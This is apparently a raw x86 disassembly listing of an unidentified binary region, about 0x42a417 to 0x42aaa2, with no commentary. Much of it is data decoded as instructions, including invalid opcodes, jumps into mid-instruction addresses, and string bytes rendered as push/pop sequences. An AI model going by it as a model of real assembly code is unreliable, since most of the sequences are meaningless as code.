  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
